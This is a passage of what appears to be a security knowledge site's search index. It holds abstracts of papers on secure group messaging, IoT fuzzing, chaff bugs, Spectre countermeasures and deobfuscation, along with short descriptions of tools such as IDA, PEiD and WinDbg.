Detection.pdf","title":"Download"},{"location":"Paper/Cryptography/Key%20Agreement%20for%20Decentralized%20Secure%20Group%20Messaging%20with%20Strong%20Security%20Guarantees/","text":"Key Agreement for Decentralized Secure Group Messaging with Strong Security Guarantees Authors: Matthew Weidner and Martin Kleppmann and Daniel Hugenroth and Alastair R. Beresford Category / Keywords: cryptographic protocols / secure messaging, group messaging, decentralization, forward secrecy, post-compromise security Original Publication (with minor differences): ACM CCS 2021 Abstract Secure group messaging protocols, providing end-to-end encryption for group communication, need to handle mobile devices frequently being offline, group members being added or removed, and the possibility of device compromises during long-lived chat sessions. Existing work targets a centralized network model in which all messages are routed through a single server, which is trusted to provide a consistent total order on updates to the group state. In this paper we adapt secure group messaging for decentralized networks that have no central authority. Servers may still optionally be used, but they are trusted less. We define decentralized continuous group key agreement (DCGKA), a new cryptographic primitive encompassing the core of a decentralized secure group messaging protocol; we give a practical construction of a DCGKA protocol and prove its security; and we describe how to construct a full messaging protocol from DCGKA. In the face of device compromise our protocol achieves forward secrecy and post-compromise security. We evaluate the performance of a prototype implementation, and demonstrate that our protocol has practical efficiency. Related GitHub repo: https://github.com/trvedata/key-agreement Download PDF: Key Agreement for Decentralized Secure Group Messaging with Strong Security Guarantees.pdf","title":"Key Agreement for Decentralized Secure Group Messaging with Strong Security Guarantees"},{"location":"Paper/Cryptography/Key%20Agreement%20for%20Decentralized%20Secure%20Group%20Messaging%20with%20Strong%20Security%20Guarantees/#key-agreement-for-decentralized-secure-group-messaging-with-strong-security-guarantees","text":"Authors: Matthew Weidner and Martin Kleppmann and Daniel Hugenroth and Alastair R. Beresford Category / Keywords: cryptographic protocols / secure messaging, group messaging, decentralization, forward secrecy, post-compromise security Original Publication (with minor differences): ACM CCS 2021","title":"Key Agreement for Decentralized Secure Group Messaging with Strong Security Guarantees"},{"location":"Paper/Cryptography/Key%20Agreement%20for%20Decentralized%20Secure%20Group%20Messaging%20with%20Strong%20Security%20Guarantees/#abstract","text":"Secure group messaging protocols, providing end-to-end encryption for group communication, need to handle mobile devices frequently being offline, group members being added or removed, and the possibility of device compromises during long-lived chat sessions. Existing work targets a centralized network model in which all messages are routed through a single server, which is trusted to provide a consistent total order on updates to the group state. In this paper we adapt secure group messaging for decentralized networks that have no central authority. Servers may still optionally be used, but they are trusted less. We define decentralized continuous group key agreement (DCGKA), a new cryptographic primitive encompassing the core of a decentralized secure group messaging protocol; we give a practical construction of a DCGKA protocol and prove its security; and we describe how to construct a full messaging protocol from DCGKA. In the face of device compromise our protocol achieves forward secrecy and post-compromise security. We evaluate the performance of a prototype implementation, and demonstrate that our protocol has practical efficiency.","title":"Abstract"},{"location":"Paper/Cryptography/Key%20Agreement%20for%20Decentralized%20Secure%20Group%20Messaging%20with%20Strong%20Security%20Guarantees/#related","text":"GitHub repo: https://github.com/trvedata/key-agreement","title":"Related"},{"location":"Paper/Cryptography/Key%20Agreement%20for%20Decentralized%20Secure%20Group%20Messaging%20with%20Strong%20Security%20Guarantees/#download","text":"PDF: Key Agreement for Decentralized Secure Group Messaging with Strong Security Guarantees.pdf","title":"Download"},{"location":"Paper/Internet%20of%20Things/Snipuzz%20Black-box%20Fuzzing%20of%20IoT%20Firmware%20via%20Message%20Snippet%20Inference/","text":"Snipuzz: Black-box Fuzzing of IoT Firmware via Message Snippet Inference [Submitted on 12 May 2021 ( v1 ), last revised 21 May 2021 (this version, v2)] Authors: Xiaotao Feng (1), Ruoxi Sun (2), Xiaogang Zhu (1), Minhui Xue (2), Sheng Wen (1), Dongxi Liu (3), Surya Nepal (3), Yang Xiang (1) ((1) Swinburne University of Technology, (2) The University of Adelaide, (3) CSIRO Data61) Comments: Accepted to ACM CCS 2021 Subjects: Cryptography and Security (cs.CR) Abstract The proliferation of Internet of Things (IoT) devices has made people's lives more convenient, but it has also raised many security concerns. Due to the difficulty of obtaining and emulating IoT firmware, the black-box fuzzing of IoT devices has become a viable option. However, existing black-box fuzzers cannot form effective mutation optimization mechanisms to guide their testing processes, mainly due to the lack of feedback. It is difficult or even impossible to apply existing grammar-based fuzzing strategies. Therefore, an efficient fuzzing approach with syntax inference is required in the IoT fuzzing domain. To address these critical problems, we propose a novel automatic black-box fuzzing for IoT firmware, termed Snipuzz. Snipuzz runs as a client communicating with the devices and infers message snippets for mutation based on the responses. Each snippet refers to a block of consecutive bytes that reflect the approximate code coverage in fuzzing. This mutation strategy based on message snippets considerably narrows down the search space to change the probing messages. We compared Snipuzz with four state-of-the-art IoT fuzzing approaches, i.e., IoTFuzzer, BooFuzz, Doona, and Nemesys. Snipuzz not only inherits the advantages of app-based fuzzing (e.g., IoTFuzzer, but also utilizes communication responses to perform efficient mutation. Furthermore, Snipuzz is lightweight as its execution does not rely on any prerequisite operations, such as reverse engineering of apps. We also evaluated Snipuzz on 20 popular real-world IoT devices. Our results show that Snipuzz could identify 5 zero-day vulnerabilities, and 3 of them could be exposed only by Snipuzz. All the newly discovered vulnerabilities have been confirmed by their vendors. Download PDF: Snipuzz Black-box Fuzzing of IoT Firmware via Message Snippet Inference.pdf","title":"Snipuzz: Black-box Fuzzing of IoT Firmware via Message Snippet Inference"},{"location":"Paper/Internet%20of%20Things/Snipuzz%20Black-box%20Fuzzing%20of%20IoT%20Firmware%20via%20Message%20Snippet%20Inference/#snipuzz-black-box-fuzzing-of-iot-firmware-via-message-snippet-inference","text":"[Submitted on 12 May 2021 ( v1 ), last revised 21 May 2021 (this version, v2)] Authors: Xiaotao Feng (1), Ruoxi Sun (2), Xiaogang Zhu (1), Minhui Xue (2), Sheng Wen (1), Dongxi Liu (3), Surya Nepal (3), Yang Xiang (1) ((1) Swinburne University of Technology, (2) The University of Adelaide, (3) CSIRO Data61) Comments: Accepted to ACM CCS 2021 Subjects: Cryptography and Security (cs.CR)","title":"Snipuzz: Black-box Fuzzing of IoT Firmware via Message Snippet Inference"},{"location":"Paper/Internet%20of%20Things/Snipuzz%20Black-box%20Fuzzing%20of%20IoT%20Firmware%20via%20Message%20Snippet%20Inference/#abstract","text":"The proliferation of Internet of Things (IoT) devices has made people's lives more convenient, but it has also raised many security concerns. Due to the difficulty of obtaining and emulating IoT firmware, the black-box fuzzing of IoT devices has become a viable option. However, existing black-box fuzzers cannot form effective mutation optimization mechanisms to guide their testing processes, mainly due to the lack of feedback. It is difficult or even impossible to apply existing grammar-based fuzzing strategies. Therefore, an efficient fuzzing approach with syntax inference is required in the IoT fuzzing domain. To address these critical problems, we propose a novel automatic black-box fuzzing for IoT firmware, termed Snipuzz. Snipuzz runs as a client communicating with the devices and infers message snippets for mutation based on the responses. Each snippet refers to a block of consecutive bytes that reflect the approximate code coverage in fuzzing. This mutation strategy based on message snippets considerably narrows down the search space to change the probing messages. We compared Snipuzz with four state-of-the-art IoT fuzzing approaches, i.e., IoTFuzzer, BooFuzz, Doona, and Nemesys. Snipuzz not only inherits the advantages of app-based fuzzing (e.g., IoTFuzzer, but also utilizes communication responses to perform efficient mutation. Furthermore, Snipuzz is lightweight as its execution does not rely on any prerequisite operations, such as reverse engineering of apps. We also evaluated Snipuzz on 20 popular real-world IoT devices. Our results show that Snipuzz could identify 5 zero-day vulnerabilities, and 3 of them could be exposed only by Snipuzz. All the newly discovered vulnerabilities have been confirmed by their vendors.","title":"Abstract"},{"location":"Paper/Internet%20of%20Things/Snipuzz%20Black-box%20Fuzzing%20of%20IoT%20Firmware%20via%20Message%20Snippet%20Inference/#download","text":"PDF: Snipuzz Black-box Fuzzing of IoT Firmware via Message Snippet Inference.pdf","title":"Download"},{"location":"Paper/Misc/Chaff%20Bugs%20Deterring%20Attackers%20by%20Making%20Software%20Buggier/","text":"Chaff Bugs: Deterring Attackers by Making Software Buggier [Submitted on 2 Aug 2018] Authors: Zhenghao Hu , Yu Hu , Brendan Dolan-Gavitt Subjects: Cryptography and Security (cs.CR) Abstract Sophisticated attackers find bugs in software, evaluate their exploitability, and then create and launch exploits for bugs found to be exploitable. Most efforts to secure software attempt either to eliminate bugs or to add mitigations that make exploitation more difficult. In this paper, we introduce a new defensive technique called chaff bugs, which instead target the bug discovery and exploit creation stages of this process. Rather than eliminating bugs, we instead add large numbers of bugs that are provably (but not obviously) non-exploitable. Attackers who attempt to find and exploit bugs in software will, with high probability, find an intentionally placed non-exploitable bug and waste precious resources in trying to build a working exploit. We develop two strategies for ensuring non-exploitability and use them to automatically add thousands of non-exploitable bugs to real-world software such as nginx and libFLAC; we show that the functionality of the software is not harmed and demonstrate that our bugs look exploitable to current triage tools. We believe that chaff bugs can serve as an effective deterrent against both human attackers and automated Cyber Reasoning Systems (CRSes). Related Chaff CTF: https://ctftime.org/event/1445 Download PDF: Chaff Bugs Deterring Attackers by Making Software Buggier.pdf","title":"Chaff Bugs: Deterring Attackers by Making Software Buggier"},{"location":"Paper/Misc/Chaff%20Bugs%20Deterring%20Attackers%20by%20Making%20Software%20Buggier/#chaff-bugs-deterring-attackers-by-making-software-buggier","text":"[Submitted on 2 Aug 2018] Authors: Zhenghao Hu , Yu Hu , Brendan Dolan-Gavitt Subjects: Cryptography and Security (cs.CR)","title":"Chaff Bugs: Deterring Attackers by Making Software Buggier"},{"location":"Paper/Misc/Chaff%20Bugs%20Deterring%20Attackers%20by%20Making%20Software%20Buggier/#abstract","text":"Sophisticated attackers find bugs in software, evaluate their exploitability, and then create and launch exploits for bugs found to be exploitable. Most efforts to secure software attempt either to eliminate bugs or to add mitigations that make exploitation more difficult. In this paper, we introduce a new defensive technique called chaff bugs, which instead target the bug discovery and exploit creation stages of this process. Rather than eliminating bugs, we instead add large numbers of bugs that are provably (but not obviously) non-exploitable. Attackers who attempt to find and exploit bugs in software will, with high probability, find an intentionally placed non-exploitable bug and waste precious resources in trying to build a working exploit. We develop two strategies for ensuring non-exploitability and use them to automatically add thousands of non-exploitable bugs to real-world software such as nginx and libFLAC; we show that the functionality of the software is not harmed and demonstrate that our bugs look exploitable to current triage tools. We believe that chaff bugs can serve as an effective deterrent against both human attackers and automated Cyber Reasoning Systems (CRSes).","title":"Abstract"},{"location":"Paper/Misc/Chaff%20Bugs%20Deterring%20Attackers%20by%20Making%20Software%20Buggier/#related","text":"Chaff CTF: https://ctftime.org/event/1445","title":"Related"},{"location":"Paper/Misc/Chaff%20Bugs%20Deterring%20Attackers%20by%20Making%20Software%20Buggier/#download","text":"PDF: Chaff Bugs Deterring Attackers by Making Software Buggier.pdf","title":"Download"},{"location":"Paper/Mobile/Consistency%20Analysis%20of%20Data-Usage%20Purposes%20in%20Mobile%20Apps/","text":"Consistency Analysis of Data-Usage Purposes in Mobile Apps Authors: Duc Bui, Yuan Yao, Kang G. Shin, Jong-Min Choi, Junbum Shin Abstract While privacy laws and regulations require apps and services to disclose the purposes of their data collection to the users (i.e., why do they collect my data?), the data usage in an app\u2019s actual behavior does not always comply with the purposes stated in its privacy policy. Automated techniques have been proposed to analyze apps\u2019 privacy policies and their execution behavior, but they often overlooked the purposes of the apps\u2019 data collection, use and sharing. To mitigate this oversight, we propose PurPliance, an automated system that detects the inconsistencies between the data-usage purposes stated in a natural language privacy policy and those of the actual execution behavior of an Android app. PurPliance analyzes the predicate-argument structure of policy sentences and classifies the extracted purpose clauses into a taxonomy of data purposes. Purposes of actual data usage are inferred from network data traffic. We propose a formal model to represent and verify the data usage purposes in the extracted privacy statements and data flows to detect policy contradictions in a privacy policy and flow-to-policy inconsistencies between network data flows and privacy statements. Our evaluation results of end-to-end contradiction detection have shown PurPliance to improve detection precision from 19% to 95% and recall from 10% to 50% compared to a state-of-the-art method. Our analysis of 23.1k Android apps has also shown PurPliance to detect contradictions in 18.14% of privacy policies and flow-topolicy inconsistencies in 69.66% of apps, indicating the prevalence of inconsistencies of data practices in mobile apps. Download PDF: Consistency Analysis of Data-Usage Purposes in Mobile Apps.pdf","title":"Consistency Analysis of Data-Usage Purposes in Mobile Apps"},{"location":"Paper/Mobile/Consistency%20Analysis%20of%20Data-Usage%20Purposes%20in%20Mobile%20Apps/#consistency-analysis-of-data-usage-purposes-in-mobile-apps","text":"Authors: Duc Bui, Yuan Yao, Kang G. Shin, Jong-Min Choi, Junbum Shin","title":"Consistency Analysis of Data-Usage Purposes in Mobile Apps"},{"location":"Paper/Mobile/Consistency%20Analysis%20of%20Data-Usage%20Purposes%20in%20Mobile%20Apps/#abstract","text":"While privacy laws and regulations require apps and services to disclose the purposes of their data collection to the users (i.e., why do they collect my data?), the data usage in an app\u2019s actual behavior does not always comply with the purposes stated in its privacy policy. Automated techniques have been proposed to analyze apps\u2019 privacy policies and their execution behavior, but they often overlooked the purposes of the apps\u2019 data collection, use and sharing. To mitigate this oversight, we propose PurPliance, an automated system that detects the inconsistencies between the data-usage purposes stated in a natural language privacy policy and those of the actual execution behavior of an Android app. PurPliance analyzes the predicate-argument structure of policy sentences and classifies the extracted purpose clauses into a taxonomy of data purposes. Purposes of actual data usage are inferred from network data traffic. We propose a formal model to represent and verify the data usage purposes in the extracted privacy statements and data flows to detect policy contradictions in a privacy policy and flow-to-policy inconsistencies between network data flows and privacy statements. Our evaluation results of end-to-end contradiction detection have shown PurPliance to improve detection precision from 19% to 95% and recall from 10% to 50% compared to a state-of-the-art method. Our analysis of 23.1k Android apps has also shown PurPliance to detect contradictions in 18.14% of privacy policies and flow-topolicy inconsistencies in 69.66% of apps, indicating the prevalence of inconsistencies of data practices in mobile apps.","title":"Abstract"},{"location":"Paper/Mobile/Consistency%20Analysis%20of%20Data-Usage%20Purposes%20in%20Mobile%20Apps/#download","text":"PDF: Consistency Analysis of Data-Usage Purposes in Mobile Apps.pdf","title":"Download"},{"location":"Paper/PWN/Exorcising%20Spectres%20with%20Secure%20Compilers/","text":"Exorcising Spectres with Secure Compilers [Submitted on 18 Oct 2019 ( v1 ), last revised 10 Sep 2021 (this version, v4)] Authors: Marco Patrignani , Marco Guarnieri Subjects: Programming Languages (cs.PL) Abstract Attackers can access sensitive information of programs by exploiting the side-effects of speculatively-executed instructions using Spectre attacks. To mitigate theses attacks, popular compilers deployed a wide range of countermeasures. The security of these countermeasures, however, has not been ascertained: while some of them are believed to be secure, others are known to be insecure and result in vulnerable programs. To reason about the security guarantees of these compiler-inserted countermeasures, this paper presents a framework comprising several secure compilation criteria characterizing when compilers produce code resistant against Spectre attacks. With this framework, we perform a comprehensive security analysis of compiler-level countermeasures against Spectre attacks implemented in major compilers. This work provides sound foundations to formally reason about the security of compiler-level countermeasures against Spectre attacks as well as the first proofs of security and insecurity of said countermeasures. Related Spectre attack: https://en.wikipedia.org/wiki/Spectre_(security_vulnerability) Meltdown and Spectre: https://meltdownattack.com/ Download PDF: Exorcising Spectres with Secure Compilers.pdf","title":"Exorcising Spectres with Secure Compilers"},{"location":"Paper/PWN/Exorcising%20Spectres%20with%20Secure%20Compilers/#exorcising-spectres-with-secure-compilers","text":"[Submitted on 18 Oct 2019 ( v1 ), last revised 10 Sep 2021 (this version, v4)] Authors: Marco Patrignani , Marco Guarnieri Subjects: Programming Languages (cs.PL)","title":"Exorcising Spectres with Secure Compilers"},{"location":"Paper/PWN/Exorcising%20Spectres%20with%20Secure%20Compilers/#abstract","text":"Attackers can access sensitive information of programs by exploiting the side-effects of speculatively-executed instructions using Spectre attacks. To mitigate theses attacks, popular compilers deployed a wide range of countermeasures. The security of these countermeasures, however, has not been ascertained: while some of them are believed to be secure, others are known to be insecure and result in vulnerable programs. To reason about the security guarantees of these compiler-inserted countermeasures, this paper presents a framework comprising several secure compilation criteria characterizing when compilers produce code resistant against Spectre attacks. With this framework, we perform a comprehensive security analysis of compiler-level countermeasures against Spectre attacks implemented in major compilers. This work provides sound foundations to formally reason about the security of compiler-level countermeasures against Spectre attacks as well as the first proofs of security and insecurity of said countermeasures.","title":"Abstract"},{"location":"Paper/PWN/Exorcising%20Spectres%20with%20Secure%20Compilers/#related","text":"Spectre attack: https://en.wikipedia.org/wiki/Spectre_(security_vulnerability) Meltdown and Spectre: https://meltdownattack.com/","title":"Related"},{"location":"Paper/PWN/Exorcising%20Spectres%20with%20Secure%20Compilers/#download","text":"PDF: Exorcising Spectres with Secure Compilers.pdf","title":"Download"},{"location":"Paper/PWN/Preventing%20Dynamic%20Library%20Compromise%20on%20Node.js%20via%20RWX-Based%20Privilege%20Reduction/","text":"Preventing Dynamic Library Compromise on Node.js via RWX-Based Privilege Reduction Authors: Vasilakis, Nikos and Staicu, Cristian-Alexandru and Ntousakis, Grigoris and Kallas, Konstantinos and Karel, Ben and DeHon, Andr\u00e9 and Pradel, Michael In: 28th ACM Conference on Computer and Communications Security (CCS 2021). Conference: CCS ACM Conference on Computer and Communications Security Abstract Third-party libraries ease the development of large-scale software systems. However, libraries often execute with significantly more privilege than needed to complete their task. Such additional privilege is sometimes exploited at runtime via inputs passed to a library, even when the library itself is not actively malicious. We present Mir, a system addressing dynamic compromise by introducing a fine-grained read-write-execute (RWX) permission model at the boundaries of libraries: every field of every free variable name in the context of an imported library is governed by a permission set. To help specify the permissions given to existing code, Mir\u2019s automated inference generates default permissions by analyzing how libraries are used by their clients. Applied to over 1,000 JavaScript libraries for Node.js, Mir shows practical security (61/63 attacks mitigated), performance (2.1s for static analysis and +1.93% for dynamic enforcement), and compatibility (99.09%) characteristics and enables a novel quantification of privilege reduction. Download PDF: Preventing Dynamic Library Compromise on Node.js via RWX-Based Privilege Reduction.pdf","title":"Preventing Dynamic Library Compromise on Node.js via RWX-Based Privilege Reduction"},{"location":"Paper/PWN/Preventing%20Dynamic%20Library%20Compromise%20on%20Node.js%20via%20RWX-Based%20Privilege%20Reduction/#preventing-dynamic-library-compromise-on-nodejs-via-rwx-based-privilege-reduction","text":"Authors: Vasilakis, Nikos and Staicu, Cristian-Alexandru and Ntousakis, Grigoris and Kallas, Konstantinos and Karel, Ben and DeHon, Andr\u00e9 and Pradel, Michael In: 28th ACM Conference on Computer and Communications Security (CCS 2021). Conference: CCS ACM Conference on Computer and Communications Security","title":"Preventing Dynamic Library Compromise on Node.js via RWX-Based Privilege Reduction"},{"location":"Paper/PWN/Preventing%20Dynamic%20Library%20Compromise%20on%20Node.js%20via%20RWX-Based%20Privilege%20Reduction/#abstract","text":"Third-party libraries ease the development of large-scale software systems. However, libraries often execute with significantly more privilege than needed to complete their task. Such additional privilege is sometimes exploited at runtime via inputs passed to a library, even when the library itself is not actively malicious. We present Mir, a system addressing dynamic compromise by introducing a fine-grained read-write-execute (RWX) permission model at the boundaries of libraries: every field of every free variable name in the context of an imported library is governed by a permission set. To help specify the permissions given to existing code, Mir\u2019s automated inference generates default permissions by analyzing how libraries are used by their clients. Applied to over 1,000 JavaScript libraries for Node.js, Mir shows practical security (61/63 attacks mitigated), performance (2.1s for static analysis and +1.93% for dynamic enforcement), and compatibility (99.09%) characteristics and enables a novel quantification of privilege reduction.","title":"Abstract"},{"location":"Paper/PWN/Preventing%20Dynamic%20Library%20Compromise%20on%20Node.js%20via%20RWX-Based%20Privilege%20Reduction/#download","text":"PDF: Preventing Dynamic Library Compromise on Node.js via RWX-Based Privilege Reduction.pdf","title":"Download"},{"location":"Paper/Reverse%20Engineering/Search-based%20Approaches%20for%20Local%20Black-Box%20Code%20Deobfuscation%20Understand%2C%20Improve%20and%20Mitigate/","text":"Search-based Approaches for Local Black-Box Code Deobfuscation Understand, Improve and Mitigate Published 2021 Authors: Gr'egoire Menguy , S\u00e9bastien Bardin , Richard Bonichon , Cauim de Souza de Lima Abstract Code obfuscation aims at protecting Intellectual Property and other secrets embedded into software from being retrieved. Recent works leverage advances in artificial intelligence (AI) with the hope of getting blackbox deobfuscators completely immune to standard (whitebox) protection mechanisms. While promising, this new field of AI-based, and more specifically search-based blackbox deobfuscation, is still in its infancy. In this article we deepen the state of search-based blackbox deobfuscation in three key directions: understand the current state-of-the-art, improve over it and design dedicated protection mechanisms. In particular, we define a novel generic framework for search-based blackbox deobfuscation encompassing prior work and highlighting key components; we are the first to point out that the search space underlying code deobfuscation is too unstable for simulation-based methods (e.g., Monte Carlo Tree Search used in prior work) and advocate the use of robust methods such as S-metaheuristics; we propose the new optimized search-based blackbox deobfuscator Xyntia which significantly outperforms prior work in terms of success rate (especially with small time budget) while being completely immune to the most recent anti-analysis code obfuscation methods; and finally we propose two novel protections against search-based blackbox deobfuscation, allowing to counter Xyntia powerful attacks. Download PDF: Search-based Approaches for Local Black-Box Code Deobfuscation Understand, Improve and Mitigate.pdf","title":"Search-based Approaches for Local Black-Box Code Deobfuscation Understand, Improve and Mitigate"},{"location":"Paper/Reverse%20Engineering/Search-based%20Approaches%20for%20Local%20Black-Box%20Code%20Deobfuscation%20Understand%2C%20Improve%20and%20Mitigate/#search-based-approaches-for-local-black-box-code-deobfuscation-understand-improve-and-mitigate","text":"Published 2021 Authors: Gr'egoire Menguy , S\u00e9bastien Bardin , Richard Bonichon , Cauim de Souza de Lima","title":"Search-based Approaches for Local Black-Box Code Deobfuscation Understand, Improve and Mitigate"},{"location":"Paper/Reverse%20Engineering/Search-based%20Approaches%20for%20Local%20Black-Box%20Code%20Deobfuscation%20Understand%2C%20Improve%20and%20Mitigate/#abstract","text":"Code obfuscation aims at protecting Intellectual Property and other secrets embedded into software from being retrieved. Recent works leverage advances in artificial intelligence (AI) with the hope of getting blackbox deobfuscators completely immune to standard (whitebox) protection mechanisms. While promising, this new field of AI-based, and more specifically search-based blackbox deobfuscation, is still in its infancy. In this article we deepen the state of search-based blackbox deobfuscation in three key directions: understand the current state-of-the-art, improve over it and design dedicated protection mechanisms. In particular, we define a novel generic framework for search-based blackbox deobfuscation encompassing prior work and highlighting key components; we are the first to point out that the search space underlying code deobfuscation is too unstable for simulation-based methods (e.g., Monte Carlo Tree Search used in prior work) and advocate the use of robust methods such as S-metaheuristics; we propose the new optimized search-based blackbox deobfuscator Xyntia which significantly outperforms prior work in terms of success rate (especially with small time budget) while being completely immune to the most recent anti-analysis code obfuscation methods; and finally we propose two novel protections against search-based blackbox deobfuscation, allowing to counter Xyntia powerful attacks.","title":"Abstract"},{"location":"Paper/Reverse%20Engineering/Search-based%20Approaches%20for%20Local%20Black-Box%20Code%20Deobfuscation%20Understand%2C%20Improve%20and%20Mitigate/#download","text":"PDF: Search-based Approaches for Local Black-Box Code Deobfuscation Understand, Improve and Mitigate.pdf","title":"Download"},{"location":"Tool/Cryptography/SageMathCell/","text":"SageMathCell SageMathCell project is an easy-to-use web interface to a free open-source mathematics software system SageMath. You can help SageMath by becoming a sponsor. It allows embedding Sage computations into any webpage: check out our short instructions, a comprehensive description of capabilities, or Notebook Player to convert Jupyter notebooks into dynamic HTML pages! Resources for your computation are provided by Departamento de Matem\u00e1ticas, Universidad Aut\u00f3noma de Madrid. You can also set up your own server. Homepage https://sagecell.sagemath.org/","title":"SageMathCell"},{"location":"Tool/Cryptography/SageMathCell/#sagemathcell","text":"SageMathCell project is an easy-to-use web interface to a free open-source mathematics software system SageMath. You can help SageMath by becoming a sponsor. It allows embedding Sage computations into any webpage: check out our short instructions, a comprehensive description of capabilities, or Notebook Player to convert Jupyter notebooks into dynamic HTML pages! Resources for your computation are provided by Departamento de Matem\u00e1ticas, Universidad Aut\u00f3noma de Madrid. You can also set up your own server.","title":"SageMathCell"},{"location":"Tool/Cryptography/SageMathCell/#homepage","text":"https://sagecell.sagemath.org/","title":"Homepage"},{"location":"Tool/PWN/IDA/","text":"IDA The best-of-breed binary code analysis tool, an indispensable item in the toolbox of world-class software analysts, reverse engineers, malware analyst and cybersecurity professionals. A powerful disassembler and a versatile debugger IDA Pro as a disassembler is capable of creating maps of their execution to show the binary instructions that are actually executed by the processor in a symbolic representation (assembly language). Advanced techniques have been implemented into IDA Pro so that it can generate assembly language source code from machine-executable code and make this complex code more human-readable. The debugging feature augmented IDA with the dynamic analysis. It supports multiple debugging targets and can handle remote applications. Its cross-platform debugging capability enables instant debugging, easy connection to both local and remote processes and support for 64-bit systems and new connection possibilities.","title":"IDA"},{"location":"Tool/PWN/IDA/#ida","text":"The best-of-breed binary code analysis tool, an indispensable item in the toolbox of world-class software analysts, reverse engineers, malware analyst and cybersecurity professionals.","title":"IDA"},{"location":"Tool/PWN/IDA/#a-powerful-disassembler-and-a-versatile-debugger","text":"IDA Pro as a disassembler is capable of creating maps of their execution to show the binary instructions that are actually executed by the processor in a symbolic representation (assembly language). Advanced techniques have been implemented into IDA Pro so that it can generate assembly language source code from machine-executable code and make this complex code more human-readable. The debugging feature augmented IDA with the dynamic analysis. It supports multiple debugging targets and can handle remote applications. Its cross-platform debugging capability enables instant debugging, easy connection to both local and remote processes and support for 64-bit systems and new connection possibilities.","title":"A powerful disassembler and a versatile debugger"},{"location":"Tool/PWN/PEiD/","text":"PEiD Description PEiD detects most common packers, cryptors and compilers for PE files. It can currently detect more than 470 different signatures in PE files. It seems that the official website (www.peid.info) has been discontinued. Hence, the tool is no longer available from the official website but it still hosted on other sites. Installation PEiD Go to http://www.softpedia.com/get/Programming/Packers-Crypters-Protectors/PEiD-updated.shtml Download PEiD-0.95-20081103.zip. Uncompress the archive. You should have a similar tree: . \u251c\u2500\u2500 external.txt \u251c\u2500\u2500 PEiD.exe \u251c\u2500\u2500 plugins \u2502 \u251c\u2500\u2500 GenOEP.dll \u2502 \u251c\u2500\u2500 ImpREC.dll \u2502 \u251c\u2500\u2500 kanal.dll \u2502 \u251c\u2500\u2500 kanal.htm \u2502 \u2514\u2500\u2500 ZDRx.dll \u251c\u2500\u2500 pluginsdk \u2502 \u251c\u2500\u2500 C++ \u2502 \u2502 \u251c\u2500\u2500 defs.h \u2502 \u2502 \u2514\u2500\u2500 null.c \u2502 \u251c\u2500\u2500 Delphi \u2502 \u2502 \u2514\u2500\u2500 Sample.dpr \u2502 \u251c\u2500\u2500 MASM \u2502 \u2502 \u251c\u2500\u2500 compile.bat \u2502 \u2502 \u251c\u2500\u2500 masm_plugin.asm \u2502 \u2502 \u2514\u2500\u2500 masm_plugin.def \u2502 \u251c\u2500\u2500 PowerBASIC \u2502 \u2502 \u2514\u2500\u2500 PEiD_Plugin.bas \u2502 \u2514\u2500\u2500 readme.txt \u251c\u2500\u2500 readme.txt \u2514\u2500\u2500 userdb.txt Signatures Update your signatures (initial file is empty). Replace the initial userdb.txt file with one of these files: http://handlers.sans.org/jclausing/userdb.txt http://reverse-engineering-scripts.googlecode.com/files/UserDB.TXT http://research.pandasecurity.com/blogs/images/userdb.txt Interface Main interface Section Viewer PE disassembler PE details Extra information Menu Screenshot Generic OEP Finder In some cases, PEiD can find the Original Entry Point (OEP) of a packed executable: Krypto Analyzer","title":"PEiD"},{"location":"Tool/PWN/PEiD/#peid","text":"","title":"PEiD"},{"location":"Tool/PWN/PEiD/#description","text":"PEiD detects most common packers, cryptors and compilers for PE files. It can currently detect more than 470 different signatures in PE files. It seems that the official website (www.peid.info) has been discontinued. Hence, the tool is no longer available from the official website but it still hosted on other sites.","title":"Description"},{"location":"Tool/PWN/PEiD/#installation","text":"","title":"Installation"},{"location":"Tool/PWN/PEiD/#peid_1","text":"Go to http://www.softpedia.com/get/Programming/Packers-Crypters-Protectors/PEiD-updated.shtml Download PEiD-0.95-20081103.zip. Uncompress the archive. You should have a similar tree: . \u251c\u2500\u2500 external.txt \u251c\u2500\u2500 PEiD.exe \u251c\u2500\u2500 plugins \u2502 \u251c\u2500\u2500 GenOEP.dll \u2502 \u251c\u2500\u2500 ImpREC.dll \u2502 \u251c\u2500\u2500 kanal.dll \u2502 \u251c\u2500\u2500 kanal.htm \u2502 \u2514\u2500\u2500 ZDRx.dll \u251c\u2500\u2500 pluginsdk \u2502 \u251c\u2500\u2500 C++ \u2502 \u2502 \u251c\u2500\u2500 defs.h \u2502 \u2502 \u2514\u2500\u2500 null.c \u2502 \u251c\u2500\u2500 Delphi \u2502 \u2502 \u2514\u2500\u2500 Sample.dpr \u2502 \u251c\u2500\u2500 MASM \u2502 \u2502 \u251c\u2500\u2500 compile.bat \u2502 \u2502 \u251c\u2500\u2500 masm_plugin.asm \u2502 \u2502 \u2514\u2500\u2500 masm_plugin.def \u2502 \u251c\u2500\u2500 PowerBASIC \u2502 \u2502 \u2514\u2500\u2500 PEiD_Plugin.bas \u2502 \u2514\u2500\u2500 readme.txt \u251c\u2500\u2500 readme.txt \u2514\u2500\u2500 userdb.txt","title":"PEiD"},{"location":"Tool/PWN/PEiD/#signatures","text":"Update your signatures (initial file is empty). Replace the initial userdb.txt file with one of these files: http://handlers.sans.org/jclausing/userdb.txt http://reverse-engineering-scripts.googlecode.com/files/UserDB.TXT http://research.pandasecurity.com/blogs/images/userdb.txt","title":"Signatures"},{"location":"Tool/PWN/PEiD/#interface","text":"","title":"Interface"},{"location":"Tool/PWN/PEiD/#main-interface","text":"","title":"Main interface"},{"location":"Tool/PWN/PEiD/#section-viewer","text":"","title":"Section Viewer"},{"location":"Tool/PWN/PEiD/#pe-disassembler","text":"","title":"PE disassembler"},{"location":"Tool/PWN/PEiD/#pe-details","text":"","title":"PE details"},{"location":"Tool/PWN/PEiD/#extra-information","text":"","title":"Extra information"},{"location":"Tool/PWN/PEiD/#menu","text":"","title":"Menu"},{"location":"Tool/PWN/PEiD/#screenshot","text":"","title":"Screenshot"},{"location":"Tool/PWN/PEiD/#generic-oep-finder","text":"In some cases, PEiD can find the Original Entry Point (OEP) of a packed executable:","title":"Generic OEP Finder"},{"location":"Tool/PWN/PEiD/#krypto-analyzer","text":"","title":"Krypto Analyzer"},{"location":"Tool/PWN/WinDbg/","text":"WinDbg The Windows Debugger (WinDbg) can be used to debug kernel-mode and user-mode code, analyze crash dumps, and examine the CPU registers while the code executes. To get started with Windows debugging, see Getting Started with Windows Debugging . Download WinDbg Preview WinDbg Preview is a new version of WinDbg with more modern visuals, faster windows, and a full-fledged scripting experience. It is built with the extensible object-orientated debugger data model front and center. WinDbg Preview is using the same 